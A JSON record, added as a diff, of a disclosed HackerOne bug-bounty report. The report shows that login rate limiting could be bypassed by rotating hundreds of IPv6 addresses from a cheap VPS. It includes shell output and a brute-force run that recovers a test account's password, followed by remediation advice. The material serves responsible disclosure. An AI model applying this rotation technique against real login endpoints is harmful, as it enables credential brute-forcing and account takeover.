@@ -1,0 +1,128 @@
+{
+  "id": 127844,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjc4NDQ=",
+  "url": "https://hackerone.com/reports/127844",
+  "title": "Web Authentication Endpoint Credentials Brute-Force Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-04-02T18:09:30.303Z",
+  "submitted_at": "2016-04-02T18:09:30.303Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "arneswinnen",
+    "url": "/arneswinnen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/061/086/26dedde13e2d4ec49acf71a95f522b54dd5e659c_original.JPG/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-06-23T23:06:21.403Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-23T23:06:21.273Z",
+  "team_member_agreed_on_going_public_at": "2016-06-23T22:39:14.014Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Dear,\n\nYour web authentication endpoint, https://hackerone.com/sessions (POST), currently protects against credentials brute-force attacks only by requests rate-limiting based on IP. It was found that if an attacker sends login requests faster than every 4 seconds from the same IP address, it would get blocked. This still allows an attacker to make the following number of guesses from one single system: 15/minute, 900/hour, 21.600/day or 648.000/month. No additional protection mechanism such as Captcha (pre-auth) or account lockout requiring additional email/phone verification (pre- or post-auth) were identified at any time. This allows for brute-forcing of credentials, for example based on breached clear-text password databases of which there are many publicly available (https://wiki.skullsecurity.org/Passwords).\n\nAdditionally, rate-limitation nowadays is not effective anymore to protect against brute-force. There are many botnets out there which can be used to overcome this hurdle, as well as cloud (VPS) services (e.g. Amazon AWS EIPs, DigitalOcean, ...), VPNs, proxies and the like. I first attempted to use TOR for PoC, but Cloudflare blocks this. However, Cloudflare also happily offers IPv6 access to HackerOne.com (https://www.cloudflare.com/ipv6/)\n\nMany VPS providers today offer a whole /64 subnet range of IPv6 addresses (18.446.744.073.709.551.616 unique addresses), such as but not limited to:\n\n- RamNode: $15/year (https://www.ramnode.com/vps.php)\n- Hetzner: $3.9/month (https://www.hetzner.de/us/hosting/produktmatrix_vserver/vserver-produktmatrix)\n- Vultr: $5/month (https://www.vultr.com/pricing/)\n\nAs a PoC, an IPv6-powered VPS its external network interface was configured to have multiple IPv6 addresses from its range (500+). Then, a brute-force python script was developed that performs a login brute-force attack by rotating through these addresses and leaving at least 4 seconds between the reuse of every IP addresses, to never have a request refused. This effectively overcomes the IP-rate limiting and allows a full-fleged online brute-force attack at virtually unlimited speeds. The following successful brute-force attack of 10.001 passwords (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt appended with the real password) against test account ██████:Geniaal2!! was performed from a VPS which costs $3.9/month (512 MB Ram, 1 processor, 100MBIT):\n\n```\n# cat 10k_most_common.txt | wc -l\n10001\n\n# tail 10k_most_common.txt \nhoes\nhowie\nhevnm4\nhugohugo\neighty\nepson\nevangeli\neeeee1\neyphed\nGeniaal2!!\n```\n\n```\n# ifconfig\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n\nvenet0    Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  \n          inet addr:127.0.0.2  P-t-P:127.0.0.2  Bcast:0.0.0.0  Mask:255.255.255.255\n          inet6 addr: 2a04:XXXX:0:32::1001/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1010/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1023/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1032/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1045/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1054/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1076/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1067/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1089/64 Scope:Global\n          inet6 addr: 2a04:XXXX:0:32::1100/64 Scope:Global\n(...SNIP...)\n\n# python hackeronebrute.py \n[INFO] Usage: python hackeronebrute.py <USERNAME> <PASSWORD_DICTIONARY_FILENAME> <INTERFACES (CSV)> <THREADS> [DEBUG]\n\n# python hackeronebrute.py ██████████ 10k_most_common.txt venet0 50 \n[INFO] Number of interfaces: 677\n[INFO] Number of interfaces per thread: 13\n[INFO] Total # threads: 50\n[INFO] Total # passwords: 10001\n31.67 pw/s [=====] 28% (2819/10001) \n31.62 pw/s [=====] 29% (2972/10001) \n31.54 pw/s [======] 31% (3122/10001) \n31.54 pw/s [======] 32% (3280/10001) \n31.48 pw/s [======] 34% (3431/10001) \n31.41 pw/s [=======] 35% (3581/10001) \n31.28 pw/s [=======] 37% (3722/10001) \n31.26 pw/s [=======] 38% (3876/10001) \n31.16 pw/s [========] 40% (4019/10001) \n31.09 pw/s [========] 41% (4166/10001) \n31.09 pw/s [========] 43% (4321/10001) \n31.06 pw/s [========] 44% (4472/10001) \n30.97 pw/s [=========] 46% (4614/10001) \n31.02 pw/s [=========] 47% (4777/10001) \n31.01 pw/s [=========] 49% (4930/10001) \n31.05 pw/s [==========] 50% (5093/10001) \n30.99 pw/s [==========] 52% (5237/10001) \n30.97 pw/s [==========] 53% (5389/10001) \n31.05 pw/s [===========] 55% (5558/10001) \n31.09 pw/s [===========] 57% (5721/10001) \n31.07 pw/s [===========] 58% (5873/10001) \n31.11 pw/s [============] 60% (6036/10001) \n30.93 pw/s [============] 61% (6186/10001) \n30.87 pw/s [============] 63% (6329/10001) \n30.84 pw/s [============] 64% (6477/10001) \n30.74 pw/s [=============] 66% (6609/10001) \n30.60 pw/s [=============] 67% (6731/10001) \n30.48 pw/s [=============] 68% (6859/10001) \n30.35 pw/s [=============] 69% (6981/10001) \n30.35 pw/s [==============] 71% (7132/10001) \n30.32 pw/s [==============] 72% (7277/10001) \n30.29 pw/s [==============] 74% (7422/10001) \n30.25 pw/s [===============] 75% (7562/10001) \n30.25 pw/s [===============] 77% (7713/10001) \n30.19 pw/s [===============] 78% (7850/10001) \n30.20 pw/s [================] 80% (8002/10001) \n30.13 pw/s [================] 81% (8136/10001) \n30.21 pw/s [================] 83% (8308/10001) \n30.23 pw/s [================] 84% (8463/10001) \n30.19 pw/s [=================] 86% (8605/10001) \n30.20 pw/s [=================] 87% (8757/10001) \n30.19 pw/s [=================] 89% (8905/10001) \n30.22 pw/s [==================] 90% (9066/10001) \n30.23 pw/s [==================] 92% (9221/10001) \n30.24 pw/s [==================] 93% (9373/10001) \n30.20 pw/s [===================] 95% (9514/10001) \n30.18 pw/s [===================] 96% (9656/10001) \n30.15 pw/s [===================] 97% (9800/10001) \n30.17 pw/s [===================] 99% (9955/10001) \n[SUCCESS] Found the right password: Geniaal2!!\n29.85 pw/s [====================] 100% (10001/10001) \n[End] Total time: 335 seconds\n```\n\nAt this rate, an attacker could guess the following number of credentials: 1.800/minute, 108.000/hour, 2.592.000/day, 77.760.000/month. After this script guessed wrongly more than 10.000 times, the successful password was found and I could simply login to hackerone.com with my test account and this password, without any additional validation whatsoever. \n\nOne example of a similar vulnerability that was exploited by Black Hats in the past would be Apple's Celebgate scandal of January 2015, where celebrity passwords were brute-forced through an unprotected Apple authentication endpoint. In the case of HackerOne, this could lead to the compromise of many accounts, since it is a well-known fact that people tend to choose similar passwords which turn up in dictionaries. Indirectly, it might grant unauthorized access to confidential bug descriptions to a successful attacker.\n\nFor more info, see http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf . A password analysis study of the 32-million clear-text password leak of the Rockyou website breach revealed that by guessing the topmost 4655 passwords in this dump against all users, an attacker would gain access to around 20% of all accounts (page 4). That would be a lot of HackerOne accounts.\n\nRecommendation: Implement a Captcha after a reasonable number of failed login attempts against one account at the application-layer. The Captcha should not only be shown to offending IP addresses, but to anyone who attempts to login to the account under attack. Another option is to enable an account lockout policy which effectively locks down an account that has been attacked (e.g. after 20 failed consecutive logins) and requires out-of-band validation by the real account owner (e.g. email, mobile) before becoming accessible again. \n\nBest regards,\n\nArne Swinnen\nhttps://www.arneswinnen.net\n\n\n\n",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 82778,
+      "file_name": "hackeronebrute.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/082/778/49af87d3fbcd387ac4aa2a095727e07aff664772/hackeronebrute.py?response-content-disposition=attachment%3B%20filename%3D%22hackeronebrute.py%22%3B%20filename%2A%3DUTF-8%27%27hackeronebrute.py&response-content-type=text%2Fx-java&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120538Z&X-Amz-Expires=2751&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=043d9e888abc1a7c9b0edf73fa270b1913050c952c55be709cca67e3f704b5d6",
+      "file_size": 4808,
+      "type": "text/x-java",
+      "moderated": null
+    },
+    {
+      "id": 82779,
+      "file_name": "10k_most_common.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/082/779/469a918047dfb8be80bd165fb0b58c966c928a46/10k_most_common.txt?response-content-disposition=attachment%3B%20filename%3D%2210k_most_common.txt%22%3B%20filename%2A%3DUTF-8%27%2710k_most_common.txt&response-content-type=text%2Fx-c%2B%2B&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJAEOSEA%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T120538Z&X-Amz-Expires=2751&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFGoM7UVkpoUFXOwmBO1YCW3cw%2F4NyxP2Yan%2BgrkBav8AiEAyCUaZteSGAOL1VybC9wE4FNtA9ZRB0rOhRCfRb1SJtUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDK4laJFhO348YrQkpSqPBT0JpdttzMzvj7d49wHxo6XKhZp6ShyKPYUpw0Uq4AHmWnLgN8g%2BsTPzAignfCeJBrRSLMJVkOL0W5ter7990DhqIASPNW1EZwrDyGA7kuePP%2BF4tcrX3LO0OOR6gGZx9EtA5T7iJB1DFapuW5N7q%2F51A5Mu7ZLK0NaZo8zhsohgiWzzyR2iluk%2FLl3XGm%2Fa6%2BcTwHua%2BNjD%2F97XLRv1zF3YE7sSdAY3bunMdQ6NaH%2BxtZj7FOWcsouUYmSWYMItq7rFc2QX6eLL04LoQhGF%2BsAlIJRuG9morj%2FzbUBeITu4Wjw1YqZoqh4stcI25Q3hf6RXlfWGW%2FpPgFVXTaKeiqdUSu86Hp0mtdhvWjZ%2F3frTMpqYRrp2a1mbGWETUc5Uf0mzI3H5oA%2B3GNQfu3cWaPp6Vj5kQ0fBwtej92wxqBKYcwQGX1OqkYgzXEkCCIsQfZxhAaPTN%2FtgMRJ58JVzNuHtKdPerJm1tZ8fQ6tljGtPSMxjFhDzyA9m9NHez5izRf7KqXOVO9vYJFw%2Fi00wL4IHCuGJag8I%2Fxka6p1qKR%2BLgjmHhEme4qKwVcZHLFn9ks9Opq5yjYs0%2BDnJLzW8EoTTImazBY6PuaPKcKQY8cuOfRLUWHjfDoiEvtTVUk8hNiRL7PEmq8TnurN%2BlvDbNHfB1bc7T4OkQ0bkDfDKxp%2Bw6kMpFfLzp3zMh4sVkCicAf8phxPfZ3ImBweoHetjdWVM%2FAaqoQFfIvSuNFRLjBRBvd1PbhmnN5Jq5WNPDsGhoXmnlt9dIMyM30uqRrm5JWVLqPt5x3tJ%2F6XEKfiDRzBMK4wT7DJ94Iud7aggpV%2BQl9JVRf86hwRXR9rFbvmmDTUka9kitEZLd%2FlL7mfvrF8wlKGsrgY6sQG6xY6iPHcuzMUPYlF%2BiPLSQhv%2F6pGqgLnKtUql08pwI3ttBcBcKWvZH4WOc5lXL1qEfHHkJQ1HwYwKvH5vG3URLBINtmvkDZGhy%2F605sBLv1QwPSjd91a2Orn1TKno6iqHfQCQTcPrP0NyRztLXpdgkxXv3JyY%2FNXpBhGdrABNb%2BwkB78q7U4iWLt6tducslFnRZ4D7lUbbNW%2FhxyDCkCcwec2EWKyZiZLijLaLBQG2P4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce81e45690d9ac528ff99c7e6f425e559dd81ad505a2e748ee7ac7a1a1e919c2",
+      "file_size": 83027,
+      "type": "text/x-c++",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-07-23T22:39:14.137Z",
+  "allow_singular_disclosure_after": -238512384.3853564,
+  "singular_disclosure_allowed": true,
+  "vote_count": 151,
+  "voters": [
+    "lukasreschke",
+    "jokebookservice1",
+    "dirk",
+    "sumzer0",
+    "philip",
+    "arneswinnen",
+    "jensec",
+    "tomdev",
+    "sp1d3rs",
+    "sourc7",
+    "and 141 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
